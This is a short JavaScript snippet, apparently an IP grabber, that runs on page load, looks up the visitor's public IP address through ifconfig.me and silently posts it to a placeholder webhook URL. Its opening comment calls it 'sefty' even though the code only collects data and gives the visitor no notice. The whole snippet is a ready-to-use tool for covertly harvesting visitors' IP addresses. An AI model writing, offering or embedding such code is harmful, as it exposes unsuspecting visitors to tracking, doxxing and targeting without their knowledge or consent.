// sefty //
async function sendWebhook() {
    let ip = await (await fetch(`https://ifconfig.me/ip`)).text()
    const webhookURL =
      "YOUR WEBHOOK URL"
  
    const message = {
      content: `${ip}`,
    }
  
    fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(message),
    })
      .then((response) => {
        if (!response.ok) {
          console.error(`Error ${response.status}: ${response.statusText}`)
        }
      })
      .catch((error) => console.error("Error:", error))
  }
  
  window.onload = function () {
    // this will run funcion on page load
    sendWebhook()
  }